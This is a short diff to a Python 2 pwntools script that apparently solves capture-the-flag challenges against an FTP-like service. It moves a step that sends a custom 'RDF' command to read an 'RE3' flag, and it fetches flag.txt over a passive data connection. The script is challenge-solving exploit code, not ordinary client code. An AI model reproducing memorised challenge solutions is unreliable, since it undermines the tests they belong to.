@@ -42,15 +42,16 @@ if __name__ == "__main__":
 	reply = sock.recv(100)
 	pasvPort = int(re.findall("(\d+)",reply)[0])
 
+	sock.sendline("RDF")
+	reply = sock.recv(100)
+	print "RE3 FLAG: %s" % (reply)
+
 	sock2 = remote(server_address, pasvPort, timeout=1)
 	sock.sendline("RETR flag.txt")
 	print sock.recv(100)
 	reply = sock2.recv(1024)
-	print "RETR flag.txt reply %s" % reply
+	print "EXP300 flag.txt reply %s" % reply
 
 	sock2.close()
-	sock.sendline("RDF")
-	reply = sock.recv(100)
-	print "RE3 FLAG: %s" % (reply)
 
 	sock.close()
